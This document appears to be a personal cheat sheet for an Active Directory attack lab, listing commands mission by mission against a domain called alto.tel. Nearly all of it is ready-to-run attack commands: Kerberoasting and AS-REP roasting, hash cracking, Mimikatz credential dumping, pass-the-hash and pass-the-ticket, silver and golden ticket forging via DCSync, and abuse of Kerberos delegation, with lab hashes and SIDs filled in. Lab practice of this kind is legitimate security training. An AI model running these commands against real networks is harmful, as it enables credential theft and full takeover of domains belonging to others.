########################################### Kerberos #############################################

Missions 9 and 10 (AsRepRoast and Kerberoast)
+++++++++++++++++++++++++++++++++++++++++++++
Get-ADUser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True"}
.\Rubeus.exe asreproast

.\Rubeus.exe kerberoast

Cracking the Hashes from asreproast or kerberost
------------------------------------------------------------
Rubeus.exe asreproast /format:john /outfile:hash-reproast.txt
john.exe --format=krb5asrep ..\..\hash-reproast.txt --wordlist=..\..\1000-most-common-passwords.txt
john.exe --show ..\..\hash-reproast.txt
hashcat -m 13100 --force -a 0 hashes-kerberoast.txt

Finding if iis.srvc is admin anywhere and dump the hashes remotely (Mission 11)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
runas.exe /user:iis.srvc@alto.tel "PowerShell.exe -ep bypass“
cd C:\Tools\
Import-Module .\PowerView.ps1
Find-LocalAdminAccess
Import-Module .\Invoke-Mimikatz-Nishang.ps1
Invoke-Mimikatz -ComputerName web-01 -Command privilege::debug
Invoke-Mimikatz -ComputerName web-01 -Command sekurlsa::logonpasswords

OverPass the Hash (Mission 12)
++++++++++++++++++++++++++++++
cd '.\mimikatz_trunk-2.2.0 20210531\x64\'
.\mimikatz.exe
sekurlsa::pth /user:dadmin.user /domain:alto.tel /ntlm:f5c31acf99137ad044072d34036a217a /run:powershell.exe
dir \\dc-01\C$

Also using Rubeus:
------------------
.\Rubeus.exe asktgt /domain:alto.tel /user:DAdmin.user /rc4:f5c31acf99137ad044072d34036a217a /ptt
klist
dir \\dc-01\C$

Pass The Ticket
+++++++++++++++++++++++++++++++++++++++++++++
.\Mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt victimticket.kirbi

.\Rubeus.exe dump
.\Rubeus.exe ptt /ticket:victimticket.kirbi

Silver Ticket (Mission 13)
+++++++++++++++++++++++++++++++++++++++++++++
To obtain domain sid (ignoring the last digits):
whoami /user
& '.\mimikatz_trunk-2.2.0 20210531\x64\mimikatz.exe'
kerberos::golden /domain:alto.tel /sid:[Domain sid] /rc4:[web-01 hash] /user:anyuser /id:500 /target:web-01.alto.tel /service:host /ptt
Klist
Schtasks /S web-01.alto.tel

passing the silver ticket with Rubeus:
--------------------------------
& '.\mimikatz_trunk-2.2.0 20210531\x64\mimikatz.exe'
kerberos::golden /domain:alto.tel /sid:[Domain sid] /rc4:[web-01 hash] /user:anyuser /id:500 /target:web-01.alto.tel /service:host
kerberos::golden /domain:alto.tel /sid:S-1-5-21-2934637008-3738319524-2168021961 /rc4:36c759facc405b6ea8dd065286698b2e /user:anyuser /id:500 /target:web-01.alto.tel /service:host /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi

Golden Ticket (Mission 14)
+++++++++++++++++++++++++++++++++++++++++++++++++++++
& '.\mimikatz_trunk-2.2.0 20210531\x64\mimikatz.exe'
sekurlsa::pth /user:DAdmin.user /domain:alto.tel /ntlm:f5c31acf99137ad044072d34036a217a /run:powershell.exe
cd C:\Tools\
import-module .\Invoke-Mimikatz-nishang.ps1
invoke-mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
& '.\mimikatz_trunk-2.2.0 20210531\x64\mimikatz.exe'
kerberos::golden /domain:alto.tel /sid:S-1-5-21-2934637008-3738319524-2168021961 /aes256:4ae3e16262ad21e864faf1f5941ee3920c67af3e973b4453f126e90e3db3a2b5 /user:administrator /groups:512 /ptt
dir \\dc-01\c$

########################################### Delegation #############################################

Unconstrained Delegation
++++++++++++++++++++++++
To find computers with Unconstrained Kerberos Delegation:
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
or
Get-NetComputer –Unconstrained | where {$_.primarygroupid -eq 515}

To monitor delegation tickets using Rubeus:
.\Rubeus.exe monitor /monitorinterval:10 /targetuser:administrator /nowrap
.\Rubeus.exe triage
.\Rubeus.exe dump /user:Administrator
Or
It can be checked and extracted using mimikatz:
& '.\mimikatz_trunk-2.2.0 20210531\x64\mimikatz.exe'
sekurlsa::tickets
sekurlsa::tickets /export

Pass The Ticket
---------------
Convert the Base64 ticket captured by Rubeus to kirbi file:
website can be used to remove whitespace from the Base64: https://www.browserling.com/tools/remove-all-whitespace
[IO.File]::WriteAllBytes("C:\Users\pwnd.user\Desktop\AD-Tools\admin.kirbi", [Convert]::FromBase64String("doIF….=="))
Pass the Ticket using Rubeus:
.\Rubeus.exe ptt /ticket:admin.kirbi
Pass the Ticket using Mimikatz:
& '.\mimikatz_trunk-2.2.0 20210531\x64\mimikatz.exe'
Kerberos::ptt C:\Users\pwnd.user\Desktop\AD-Tools\admin.kirbi

Constrained Delegation
++++++++++++++++++++++++
To find User Accounts with T2A4D and msDS-AllowedToDelegateTo:
Get-ADObject -Properties samaccountname,useraccountcontrol,msds-allowedtodelegateto | where {$_.useraccountcontrol -like '*TRUSTED_TO_AUTH_FOR_DELEGATION*'} | fl
Or
Get-NetUser -TrustedToAuth
Access iis.srvc account and try to access DC file share:
runas /netonly /user:alto\iis.srvc "powershell.exe -ep bypass"
cd c:\tools\
Now request for Delegation TGT:
.\Rubeus.exe tgtdeleg
whitespace can be removed from the Base64 ticket using: https://www.browserling.com/tools/remove-all-whitespace
Request TGS for Administrator to authenticate to CIFS/DC-01.alto.tel
.\Rubeus.exe s4u /ticket:[Base64 delegation TGT ticket] /impersonateuser:administrator /domain:alto.tel /msdsspn:cifs/dc-01.alto.tel /dc:dc-01.alto.tel /ptt
Confirm you have the requested ticket 
Klist
Dir \\DC-01.alto.tel\C$

Resource Based Constrained Delegation:
++++++++++++++++++++++++++++++++++++++
To enumerate the Domain for the number of machines quota:
Get-DomainObject -Identity "dc=alto,dc=tel" -Domain alto.tel | select ms-ds-machineaccountquota
Check for the web-01 computer object msDS-AllowedToActOnBehalfOfOtherIdentity attribute:
Get-NetComputer web-01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
Using PowerMad, PowerShell MachineAccountQuota exploitation tool to create new Evil computer object & obtain its sid
Import-Module .\Powermad-master1\Powermad.ps1
New-MachineAccount -MachineAccount Evil-01 -Password $(ConvertTo-SecureString ‘Passw0rd!' -AsPlainText -Force) –Verbose
Get-DomainComputer Evil-01 | select objectsid
Using the AD module set msDS-AllowedToActOnBehalfOfOtherIdentity security descriptor on web-01 to delegate Evil-01 computer account:
Set-ADComputer WEB-01 -PrincipalsAllowedToDelegateToAccount Evil-01$
Check if it has been configured properly:
Get-ADComputer WEB-01 -Properties PrincipalsAllowedToDelegateToAccount
To perform the S4U, we need Evil-01 hash:
.\Rubeus.exe hash /password:Passw0rd! /user:Evil-01$ /domain:alto.tel
Using the hash, we can perform the S4U Attack
.\Rubeus.exe s4u /user:Evil-01$ /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:administrator /msdsspn:cifs/web-01 /ptt
If it succeeded, you should be able to perform directory listing and maybe have RCE?
ls \\web-01\c$
.\PsExec64.exe \\web-01 cmd
if psexec didnt work, try placing the below instead:
/msdsspn:http/web-01 /altservice:cifs,host

########################################### BloodHound #############################################
to run bloodhound:
& '.\BloodHound Installation Folder\BloodHound-win32-x641\BloodHound.exe'
to run sharphound to collect information:
& '.\BloodHound Installation Folder\BloodHound-master\Collectors\SharpHound.exe' -d alto.tel
if it didnt work, use the powershell collector:
 Import-Module '.\BloodHound Installation Folder\BloodHound-master\Collectors\SharpHound.ps1'
Invoke-BloodHound -d alto.tel -CollectionMethod All

Bloodhound queries:
To List All Kerberostable Accounts:
MATCH (n:User)WHERE n.hasspn=true RETURN n
Find AS-REP Roastable Users (DontReqPreAuth):
MATCH (u:User {dontreqpreauth: true}) RETURN u
Find all sessions any user in a specific domain has:
MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain: “ALTO.TEL”}) RETURN p
